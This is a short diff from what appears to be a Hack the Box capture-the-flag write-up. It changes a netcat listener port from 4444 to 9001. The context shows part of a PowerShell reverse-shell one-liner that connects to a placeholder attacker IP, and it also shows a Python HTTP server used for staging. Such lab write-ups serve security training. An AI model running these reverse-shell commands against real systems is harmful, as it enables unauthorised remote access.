@@ -177,7 +177,7 @@ $client = New-Object System.Net.Sockets.TCPClient('<attacker_IP>',<port>);$strea
 ▶ python -m http.server
 ```
 ```CSS
-▶ nc -nlvvp 4444
+▶ nc -nlvvp 9001
 ```
 ![image](https://github.com/0xhardyboy/Hack-the-Box/assets/83878909/34e2c57a-9b02-4433-a031-22ebb0673841)
 
